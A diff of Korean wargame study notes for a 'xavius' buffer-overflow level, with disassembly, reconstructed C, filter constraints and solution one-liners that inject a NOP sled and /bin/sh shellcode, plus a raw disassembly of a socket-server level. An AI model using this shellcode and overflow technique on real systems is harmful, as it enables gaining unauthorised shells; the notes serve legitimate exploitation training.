@@ -1552,122 +1552,212 @@ ret부분이 strcpy함수주소가 아니면 exit됨
 
 &ret2, &buffer를 동시에 16바이트씩 변경하였음
 한개 올렸더니 깨짐
+```
 
+## (19) nightmare / beg for me
 
-  0x8048714  <main>:       push   %ebp   0x8048715  <main+1>:     mov    %ebp,%esp     0x8048717  <main+3>:     sub    %esp,44     0x804871a  <main+6>:     mov    %eax,%ds:0x8049a3c   0x804871f  <main+11>:    push   %eax   0x8048720  <main+12>:    push   0x100   0x8048725 <main+17>:     lea    %eax,[%ebp-40]   0x8048728  <main+20>:    push   %eax   0x8048729 <main+21>:     call   0x8048408 <fgets>   0x804872e  <main+26>:    add    %esp,12     0x8048731  <main+29>:    lea    %eax,[%ebp-40]   0x8048734  <main+32>:    push   %eax   0x8048735 <main+33>:     push   0x80488bb   0x804873a  <main+38>:    call   0x8048438  <printf>   0x804873f  <main+43>:    add    %esp,8     0x8048742  <main+46>:    cmp    BYTE PTR [%ebp+7],0xbf   0x8048746  <main+50>:    jne    0x8048760  <main+76>   0x8048748  <main+52>:    push   0x80488bf   0x804874d  <main+57>:    call   0x8048438  <printf>   0x8048752  <main+62>:    add    %esp,4     0x8048755  <main+65>:    push   0   0x8048757  <main+67>:    call   0x8048458 <exit>   0x804875c  <main+72>:    add    %esp,4     0x804875f  <main+75>:    nop       0x8048760  <main+76>:    cmp    BYTE PTR  [%ebp+7],0x8   0x8048764 <main+80>:     jne    0x8048780 <main+108>   0x8048766  <main+82>:    push   0x80488e0   0x804876b <main+87>:     call   0x8048438 <printf>   0x8048770  <main+92>:    add    %esp,4     0x8048773 <main+95>:     push   0   0x8048775  <main+97>:    call   0x8048458  <exit>   0x804877a <main+102>:    add    %esp,4     0x804877d  <main+105>:   lea    %esi,[%esi]     0x8048780 <main+108>:    push   4   0x8048782  <main+110>:   lea    %eax,[%ebp-40]   0x8048785  <main+113>:   lea    %edx,[%eax+44]   0x8048788  <main+116>:   push   %edx   0x8048789  <main+117>:   lea    %eax,[%ebp-44]   0x804878c  <main+120>:   push   %eax   0x804878d  <main+121>:   call   0x8048448 <memcpy>   0x8048792 <main+126>:    add    %esp,12     0x8048795  <main+129>:   push   2   0x8048797 <main+131>:    push   0x8048902   0x804879c  <main+136>:   mov    %eax,DWORD PTR  [%ebp-44]   0x804879f  <main+139>:   push   %eax   0x80487a0  <main+140>:   call   0x8048418 <memcmp>   0x80487a5 <main+145>:    add    %esp,12     0x80487a8  <main+148>:   mov    %eax,%eax   0x80487aa <main+150>:    test   %eax,%eax   0x80487ac  <main+152>:   jne    0x80487b0  <main+156>   0x80487ae  <main+154>:   jmp    0x80487e0  <main+204>   0x80487b0  <main+156>:   mov    %eax,DWORD PTR [%ebp-44]   0x80487b3  <main+159>:   cmp    BYTE PTR  [%eax],0xc9   0x80487b6  <main+162>:   jne    0x80487d8 <main+196>   0x80487b8  <main+164>:   mov    %eax,DWORD PTR  [%ebp-44]   0x80487bb  <main+167>:   inc    %eax   0x80487bc  <main+168>:   cmp    BYTE PTR  [%eax],0xc3   0x80487bf  <main+171>:   jne    0x80487d8  <main+196>   0x80487c1  <main+173>:   push   0x8048920   0x80487c6  <main+178>:   call   0x8048438 <printf>   0x80487cb  <main+183>:   add    %esp,4     0x80487ce  <main+186>:   push   0   0x80487d0 <main+188>:    call   0x8048458 <exit>   0x80487d5  <main+193>:   add    %esp,4     0x80487d8 <main+196>:    inc    DWORD PTR [%ebp-44]   0x80487db  <main+199>:   jmp    0x8048795 <main+129>     0x80487dd  <main+201>:   lea    %esi,[%esi]     0x80487e0  <main+204>:   push   44   0x80487e2 <main+206>:    push   0   0x80487e4  <main+208>:   lea    %eax,[%ebp-40]   0x80487e7 <main+211>:    push   %eax   0x80487e8  <main+212>:   call   0x8048468 <memset>   0x80487ed <main+217>:    add    %esp,12     0x80487f0  <main+220>:   lea    %eax,[%ebp-40]   0x80487f3 <main+223>:    mov    %edx,0xbfffffcf   0x80487f8  <main+228>:   mov    %ecx,%edx   0x80487fa <main+230>:    sub    %ecx,%eax   0x80487fc  <main+232>:   mov    %eax,%ecx   0x80487fe <main+234>:    push   %eax   0x80487ff  <main+235>:   push   0   0x8048801  <main+237>:   lea    %eax,[%ebp-40]   0x8048804  <main+240>:   lea    %edx,[%eax+48]   0x8048807 <main+243>:    push   %edx   0x8048808  <main+244>:   call   0x8048468 <memset>   0x804880d <main+249>:    add    %esp,12     0x8048810  <main+252>:   push   0xb90   0x8048815  <main+257>:   push   0   0x8048817  <main+259>:   lea    %eax,[%ebp-40]   0x804881a  <main+262>:   lea    %edx,[%eax-3000]   0x8048820  <main+268>:   push   %edx   0x8048821  <main+269>:   call   0x8048468 <memset>   0x8048826 <main+274>:    add    %esp,12     0x8048829  <main+277>:   leave   0x804882a <main+278>:    ret	프롤로그     stack memory 44bytes   ebp-44: char * addr;   ebp-40: char buffer[40];     stdin   0x100 = 256   fgets(buffer,256,stdin);           printf("%s\n",buffer);           if(ebp+7==0xbf){   printf("stack retbayed  you!\n");             exit(0);   }         if(ebp+7==0x8){     printf("binary  image retbayed you, too!!\n")   exit(0);               }     ebp-40+44=ebp+4   memcpy(addr,ebp+4,4);                   memcmp(addr, 0x8048902,2);     //0x8048902 <_IO_stdin_used+126>:  0x00009090 -> 9090             while(1){       if(addr==0xc9){ break; }   (0xc9=>201)     if((addr+1)==0xc3){ break; }     0xc3=>195       printf("You cannot use library  function!\n");         exit(0);       addr++;   }             memset(buffer,0,44);           memset(ebp+8,0,bfffffcf-addr);                             0xb90=2960     memset(addr-3000, 0, 2960);
-                                          	                                        
+### 문제 개요
+**assembly 코드**
+```
+0x8048714  <main>:       push   %ebp   
+0x8048715  <main+1>:     mov    %ebp,%esp     
 
-<test : and연산. 두개가
+0x8048717  <main+3>:     sub    %esp,44     
 
-다 0인 경우에만 참, 나머지는 거짓.>
+0x804871a  <main+6>:     mov    %eax,%ds:0x8049a3c   
+0x804871f  <main+11>:    push   %eax   
+0x8048720  <main+12>:    push   0x100   
+0x8048725  <main+17>:    lea    %eax,[%ebp-40]   
+0x8048728  <main+20>:    push   %eax   
+0x8048729  <main+21>:    call   0x8048408 <fgets>   
+0x804872e  <main+26>:    add    %esp,12     
 
+0x8048731  <main+29>:    lea    %eax,[%ebp-40]   
+0x8048734  <main+32>:    push   %eax   
+0x8048735  <main+33>:    push   0x80488bb   
+0x804873a  <main+38>:    call   0x8048438  <printf>   
+0x804873f  <main+43>:    add    %esp,8     
+
+0x8048742  <main+46>:    cmp    BYTE PTR [%ebp+7],0xbf   
+0x8048746  <main+50>:    jne    0x8048760  <main+76>   
+0x8048748  <main+52>:    push   0x80488bf   
+0x804874d  <main+57>:    call   0x8048438  <printf>   
+0x8048752  <main+62>:    add    %esp,4     
+
+0x8048755  <main+65>:    push   0   
+0x8048757  <main+67>:    call   0x8048458 <exit>   
+0x804875c  <main+72>:    add    %esp,4     
+
+0x804875f  <main+75>:    nop       
+
+0x8048760  <main+76>:    cmp    BYTE PTR  [%ebp+7],0x8   
+0x8048764  <main+80>:    jne    0x8048780 <main+108>   
+0x8048766  <main+82>:    push   0x80488e0   
+0x804876b  <main+87>:    call   0x8048438 <printf>   
+0x8048770  <main+92>:    add    %esp,4     
+
+0x8048773  <main+95>:    push   0   
+0x8048775  <main+97>:    call   0x8048458  <exit>   
+0x804877a  <main+102>:   add    %esp,4     
+
+0x804877d  <main+105>:   lea    %esi,[%esi]     
+
+0x8048780  <main+108>:   push   4   
+0x8048782  <main+110>:   lea    %eax,[%ebp-40]   
+0x8048785  <main+113>:   lea    %edx,[%eax+44]   
+0x8048788  <main+116>:   push   %edx   
+0x8048789  <main+117>:   lea    %eax,[%ebp-44]   
+0x804878c  <main+120>:   push   %eax   
+0x804878d  <main+121>:   call   0x8048448 <memcpy>   
+0x8048792  <main+126>:   add    %esp,12     
+
+0x8048795  <main+129>:   push   2   
+0x8048797  <main+131>:   push   0x8048902   
+0x804879c  <main+136>:   mov    %eax,DWORD PTR  [%ebp-44]   
+0x804879f  <main+139>:   push   %eax   
+0x80487a0  <main+140>:   call   0x8048418 <memcmp>   
+0x80487a5  <main+145>:   add    %esp,12     
+
+0x80487a8  <main+148>:   mov    %eax,%eax   
+0x80487aa  <main+150>:   test   %eax,%eax   
+0x80487ac  <main+152>:   jne    0x80487b0  <main+156>   
+0x80487ae  <main+154>:   jmp    0x80487e0  <main+204>   
+0x80487b0  <main+156>:   mov    %eax,DWORD PTR [%ebp-44]   
+0x80487b3  <main+159>:   cmp    BYTE PTR  [%eax],0xc9   
+0x80487b6  <main+162>:   jne    0x80487d8 <main+196>   
+0x80487b8  <main+164>:   mov    %eax,DWORD PTR  [%ebp-44]   
+0x80487bb  <main+167>:   inc    %eax   
+0x80487bc  <main+168>:   cmp    BYTE PTR  [%eax],0xc3   
+0x80487bf  <main+171>:   jne    0x80487d8  <main+196>   
+0x80487c1  <main+173>:   push   0x8048920   
+0x80487c6  <main+178>:   call   0x8048438 <printf>   
+0x80487cb  <main+183>:   add    %esp,4     
+
+0x80487ce  <main+186>:   push   0   
+0x80487d0  <main+188>:   call   0x8048458 <exit>   
+0x80487d5  <main+193>:   add    %esp,4     
+
+0x80487d8  <main+196>:   inc    DWORD PTR [%ebp-44]   
+0x80487db  <main+199>:   jmp    0x8048795 <main+129>     
+
+0x80487dd  <main+201>:   lea    %esi,[%esi]     
+
+0x80487e0  <main+204>:   push   44   
+0x80487e2  <main+206>:   push   0   
+0x80487e4  <main+208>:   lea    %eax,[%ebp-40]   
+0x80487e7  <main+211>:   push   %eax   
+0x80487e8  <main+212>:   call   0x8048468 <memset>   
+0x80487ed  <main+217>:   add    %esp,12     
+
+0x80487f0  <main+220>:   lea    %eax,[%ebp-40]   
+0x80487f3  <main+223>:   mov    %edx,0xbfffffcf   
+0x80487f8  <main+228>:   mov    %ecx,%edx   
+0x80487fa  <main+230>:   sub    %ecx,%eax   
+0x80487fc  <main+232>:   mov    %eax,%ecx   
+0x80487fe  <main+234>:   push   %eax   
+0x80487ff  <main+235>:   push   0   
+0x8048801  <main+237>:   lea    %eax,[%ebp-40]   
+0x8048804  <main+240>:   lea    %edx,[%eax+48]   
+0x8048807  <main+243>:   push   %edx   
+0x8048808  <main+244>:   call   0x8048468 <memset>   
+0x804880d  <main+249>:   add    %esp,12     
+
+0x8048810  <main+252>:   push   0xb90   
+0x8048815  <main+257>:   push   0   
+0x8048817  <main+259>:   lea    %eax,[%ebp-40]   
+0x804881a  <main+262>:   lea    %edx,[%eax-3000]   
+0x8048820  <main+268>:   push   %edx   
+0x8048821  <main+269>:   call   0x8048468 <memset>   
+0x8048826  <main+274>:   add    %esp,12     
+
+0x8048829  <main+277>:   leave   
+0x804882a  <main+278>:   ret
+```
+
+### 참고: assembly에서 test
+- and연산
+- 따라서 두개가 다 0인 경우에만 참, 나머지는 거짓
+
+**c언어로 예측하여 변환한 코드**
+```
 char buffer[40];
-
 char * addr;
 
 fgets(buffer,256,stdin);
+printf("%s\n",buffer);
 
- printf("%s\n",buffer);
+if(ebp+7 == 0xbf){
+  printf("stack retbayed you!\n");
+  exit(0);
+}
 
-if(ebp+7==0xbf){
+if(ebp+7 == 0x8){
+  printf("binary image retbayed you, too!!\n")
+  exit(0);
+}
 
- printf("stack retbayed
+memcpy(addr, ebp+4(RET), 4);
 
-you!\n");
-
- exit(0);
-
- }
-
- if(ebp+7==0x8){
-
- printf("binary image retbayed you,
-
-too!!\n")
-
- exit(0);
-
- }
-
-memcpy(addr,ebp+4(RET),4);
-
-while( memcmp(addr, "\x90\x90" ,2) !=0 ){
-
- if(*addr==0xc9){ 
-
-  if(*(addr+1)==0xc3){ 
-
-   printf("You cannot use library
-
-function!\n");
-
-    exit(0);
-
+while( memcmp(addr, "\x90\x90" ,2) != 0){
+  if(*addr == 0xc9){ 
+    if(*(addr+1) == 0xc3){
+      printf("You cannot use library function!\n");
+      exit(0);
     }
-
   }
-
 addr++;
+}
+```
 
- }
+### 제약조건
 
-memset(buffer,0,44);        
+```
+memset(buffer, 0, 44);          // buffer 0으로 초기화
+memset(ebp+8,0,bfffffcf-addr);  //ret다음부터 아래를 0으로 초기화
+memset(addr-3000, 0, 2960);     // buffer윗부분 삭제(LD Preload)
+                                // ret만 제외하고 모두 0으로 초기화
+```
 
-      // buffer 0으로 초기화
+1. bf 영역 사용 불가
+2. 08 영역(바이너리) 사용 불가
+3. ebp+4(ret)의 시작주소 80으로 시작x
+4. c9c3으로 시작x
+5. 스택 영역 초기화
 
- memset(ebp+8,0,bfffffcf-addr); //ret다음부터
+### 문제풀이
 
-아래를 0으로 초기화
+- 40 영역 찾아보기
+- `(python -c'print  "a"*44+"\xbb\xbb\xbb\xbf"';cat)|./xavius`
+--> stack retbayed you!
 
- memset(addr-3000, 0, 2960);   //
+- `(python -c 'print "a"*44+"\xbb\xbb\xbb\xbb"';cat)|./xavius`
+--> binary image retbayed you, too!!
 
-buffer윗부분 삭제(LD Preload)
+- `(python -c 'print "a"*44+"\xe0\x8a\x05\x40"';cat)|./xavius`
+- 시스템함수 <0x40058ae0> 호출한 경우 -->"You cannot use library function!\n"
+- *c9c39090 --> leave ret nop nop
+  + 함수의 마지막이 대부분 위와 같은 형태임
+  + 따라서 함수를 쓰지 못하도록 한 것
+  + 40형태라더라도 함수형태가 아니면 사용 가능
 
-                                           // ret만 제외하고 모두 0으로 초기화
+`strace ./xavius` --> 이용하고 있는 system call을 보여줌
+이 경우 남아있는 40영역 중에서 함수 형태가 아닌 것은 사용 가능하므로 read할 때 잠시 0x40015000영역에 저장해 두었다가 사용 가능
 
-* Xavius
+```
+old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0
 
-\1. bf 영역 사용 불가
+x40015000 ioctl(0, TCGETS, {B9600 opost isig icanon echo ...}) = 0 
+read(0, abcdefg "abcdefg\n", 1024) = 8
+```
 
-\2. 08 영역(바이너리) 사용불가
-
-\3. ebp+4(ret)의 시작주소 80으로 시작.x
-
-\4. c9c3으로 시작x
-
-\5. 스택 영역 초기화
-
-->40 찾아보기.
-
-(python -c'print  "a"*44+"\xbb\xbb\xbb\xbf"';cat)|./xavius    --> stack retbayed you!
-
-(python -c 'print "a"*44+"\xbb\xbb\xbb\xbb"';cat)|./xavius --> binary image retbayed you, too!!
-
-(python -c 'print 
-
-"a"*44+"\xe0\x8a\x05\x40"';cat)|./xavius
-
-시스템함수 <0x40058ae0> 호출한 경우 ->"You cannot use library function!\n"
-
-*c9c39090-->leave ret nop nop 
-
-함수의 마지막이 대부분 위와 같은 형태임. 따라서 함수를 쓰지 못하도록 한 것.
-
-40형태라더라도 함수형태가 아니면 사용 가능.
-
-strace ./xavius
-
-이용하고 있는 system call을 보여줌.
-
-이 경우 남아있는 40영역 중에서 함수 형태가 아닌 것은 사용 가능하므로
-
-read할 때 잠시 0x40015000영역에 저장해 두었다가 사용.
-
+```
 (python -c'print "\x90"*19+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x00\x50\x01\x40"';cat)|./xavius
 
-perl로 하면 뒷자리를 01로 바꾸어 주면 됨.
+perl로 하면 뒷자리를 01로 바꾸어 주면 됨
 
 (perl -e 'print  "\x90"x19. "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80".  "\x01\x50\x01\x40"';cat)|./xavius
+```
+
 
   0x80488c4  <main>:       push   %ebp   0x80488c5  <main+1>:     mov    %ebp,%esp     0x80488c7  <main+3>:     sub    %esp,84     0x80488ca  <main+6>:     push   0   0x80488cc  <main+8>:     push   1   0x80488ce  <main+10>:    push   2   0x80488d0 <main+12>:     call   0x804861c <socket>   0x80488d5  <main+17>:    add    %esp,12     0x80488d8  <main+20>:    mov    %eax,%eax   0x80488da  <main+22>:    mov    DWORD PTR [%ebp-44],%eax   0x80488dd  <main+25>:    cmp    DWORD PTR  [%ebp-44],-1   0x80488e1  <main+29>:    jne    0x8048900  <main+60>     0x80488e3  <main+31>:    push   0x8048afb   0x80488e8  <main+36>:    call   0x804853c  <perror>   0x80488ed  <main+41>:    add    %esp,4     0x80488f0  <main+44>:    push   1   0x80488f2  <main+46>:    call   0x80485dc  <exit>   0x80488f7  <main+51>:    add    %esp,4     0x80488fa  <main+54>:    lea    %esi,[%esi]   0x8048900  <main+60>:    mov    DWORD PTR  [%ebp-64],0x2   0x8048906  <main+66>:    push   0x1a0a   0x804890b  <main+71>:    call   0x80485fc  <htons>   0x8048910  <main+76>:    add    %esp,4     0x8048913  <main+79>:    mov    %eax,%eax   0x8048915  <main+81>:    mov    DWORD PTR  [%ebp-62],%ax   0x8048919 <main+85>:     mov    DWORD PTR [%ebp-60],0x0   0x8048920  <main+92>:    push   8   0x8048922  <main+94>:    lea    %eax,[%ebp-64]   0x8048925  <main+97>:    lea    %edx,[%eax+8]   0x8048928 <main+100>:    push   %edx   0x8048929  <main+101>:   call   0x80485cc <bzero>   0x804892e  <main+106>:   add    %esp,8     0x8048931  <main+109>:   push   16   0x8048933  <main+111>:   lea    %edx,[%ebp-64]   0x8048936  <main+114>:   mov    %eax,%edx   0x8048938  <main+116>:   push   %eax   0x8048939 <main+117>:    mov    %eax,DWORD PTR [%ebp-44]   0x804893c  <main+120>:   push   %eax   0x804893d <main+121>:    call   0x80485bc <bind>   0x8048942  <main+126>:   add    %esp,12     0x8048945 <main+129>:    mov    %eax,%eax   0x8048947  <main+131>:   cmp    %eax,-1   0x804894a <main+134>:    jne    0x8048963 <main+159>   0x804894c  <main+136>:   push   0x8048b02   0x8048951 <main+141>:    call   0x804853c <perror>   0x8048956  <main+146>:   add    %esp,4     0x8048959 <main+149>:    push   1   0x804895b  <main+151>:   call   0x80485dc <exit>   0x8048960 <main+156>:    add    %esp,4     0x8048963  <main+159>:   push   10   0x8048965 <main+161>:    mov    %eax,DWORD PTR [%ebp-44]   0x8048968  <main+164>:   push   %eax   0x8048969 <main+165>:    call   0x804856c <listen>   0x804896e  <main+170>:   add    %esp,8     0x8048971 <main+173>:    mov    %eax,%eax   0x8048973  <main+175>:   cmp    %eax,-1   0x8048976 <main+178>:    jne    0x8048990 <main+204>   0x8048978  <main+180>:   push   0x8048b07   0x804897d <main+185>:    call   0x804853c <perror>   0x8048982  <main+190>:   add    %esp,4     0x8048985 <main+193>:    push   1   0x8048987  <main+195>:   call   0x80485dc <exit>   0x804898c <main+200>:    add    %esp,4     0x804898f  <main+203>:   nop   0x8048990  <main+204>:   nop   0x8048991  <main+205>:   jmp    0x8048998  <main+212>   0x8048993 <main+207>:    jmp    0x8048a60 <main+412>   0x8048998  <main+212>:   mov    DWORD PTR  [%ebp-84],0x10   0x804899f <main+219>:    lea    %eax,[%ebp-84]   0x80489a2  <main+222>:   push   %eax   0x80489a3 <main+223>:    lea    %edx,[%ebp-80]   0x80489a6  <main+226>:   mov    %eax,%edx   0x80489a8  <main+228>:   push   %eax   0x80489a9  <main+229>:   mov    %eax,DWORD PTR  [%ebp-44]   0x80489ac  <main+232>:   push   %eax   0x80489ad  <main+233>:   call   0x804855c <accept>   0x80489b2  <main+238>:   add    %esp,12     0x80489b5  <main+241>:   mov    %eax,%eax   0x80489b7  <main+243>:   mov    DWORD PTR [%ebp-48],%eax   0x80489ba  <main+246>:   cmp    DWORD PTR  [%ebp-48],-1   0x80489be  <main+250>:   jne    0x80489d0  <main+268>   0x80489c0  <main+252>:   push   0x8048b0e   0x80489c5  <main+257>:   call   0x804853c <perror>   0x80489ca  <main+262>:   add    %esp,4     0x80489cd  <main+265>:   jmp    0x8048991 <main+205>   0x80489cf  <main+267>:   nop   0x80489d0  <main+268>:   call   0x804854c <fork>   0x80489d5 <main+273>:    mov    %eax,%eax   0x80489d7  <main+275>:   test   %eax,%eax   0x80489d9 <main+277>:    jne    0x8048a30 <main+364>   0x80489db  <main+279>:   push   0   0x80489dd <main+281>:    push   52   0x80489df  <main+283>:   push   0x8048b20   0x80489e4 <main+288>:    mov    %eax,DWORD PTR [%ebp-48]   0x80489e7  <main+291>:   push   %eax   0x80489e8 <main+292>:    call   0x80485ec <send>   0x80489ed  <main+297>:   add    %esp,16     0x80489f0 <main+300>:    push   0   0x80489f2  <main+302>:   push   6   0x80489f4  <main+304>:   push   0x8048b55   0x80489f9  <main+309>:   mov    %eax,DWORD PTR  [%ebp-48]   0x80489fc <main+312>:    push   %eax   0x80489fd  <main+313>:   call   0x80485ec <send>   0x8048a02 <main+318>:    add    %esp,16     0x8048a05  <main+321>:   push   0   0x8048a07  <main+323>:   push   0x100   0x8048a0c  <main+328>:   lea    %eax,[%ebp-40]   0x8048a0f  <main+331>:   push   %eax   0x8048a10 <main+332>:    mov    %eax,DWORD PTR [%ebp-48]   0x8048a13  <main+335>:   push   %eax   0x8048a14 <main+336>:    call   0x804860c <recv>   0x8048a19  <main+341>:   add    %esp,16     0x8048a1c <main+344>:    mov    %eax,DWORD PTR [%ebp-48]   0x8048a1f  <main+347>:   push   %eax   0x8048a20 <main+348>:    call   0x804852c <close>   0x8048a25  <main+353>:   add    %esp,4     0x8048a28 <main+356>:    jmp    0x8048a60 <main+412>   0x8048a2a  <main+358>:   lea    %esi,[%esi]   0x8048a30  <main+364>:   mov    %eax,DWORD PTR  [%ebp-48]   0x8048a33  <main+367>:   push   %eax   0x8048a34 <main+368>:    call   0x804852c <close>   0x8048a39  <main+373>:   add    %esp,4     0x8048a3c <main+376>:    lea    %esi,[%esi*1]   0x8048a40  <main+380>:   push   1   0x8048a42 <main+382>:    push   0   0x8048a44  <main+384>:   push   -1   0x8048a46  <main+386>:   call   0x804858c  <waitpid>   0x8048a4b  <main+391>:   add    %esp,12     0x8048a4e  <main+394>:   mov    %eax,%eax   0x8048a50  <main+396>:   test   %eax,%eax   0x8048a52 <main+398>:    jg     0x8048a56 <main+402>   0x8048a54  <main+400>:   jmp    0x8048a58  <main+404>   0x8048a56  <main+402>:   jmp    0x8048a40  <main+380>   0x8048a58  <main+404>:   jmp    0x8048991  <main+205>   0x8048a5d  <main+409>:   lea    %esi,[%esi]   0x8048a60  <main+412>:   mov    %eax,DWORD PTR  [%ebp-44]   0x8048a63  <main+415>:   push   %eax   0x8048a64  <main+416>:   call   0x804852c <close>   0x8048a69 <main+421>:    add    %esp,4     0x8048a6c  <main+424>:   leave   0x8048a6d  <main+425>:   ret	static memory 84 bytes         sock=socket(2,1,0);         if(sock==-1){   perror("socket");                   exit(1);   }       <0x1a0a=6666>   htons(6666);                   bzero();                   bind();               perror();             exit(1);           listen();               perror();           exit(1);                               accept();               perror();           fork();             send();                   send();                     recv();               close();           close();               waitpid();                         close();
                                           	                                        
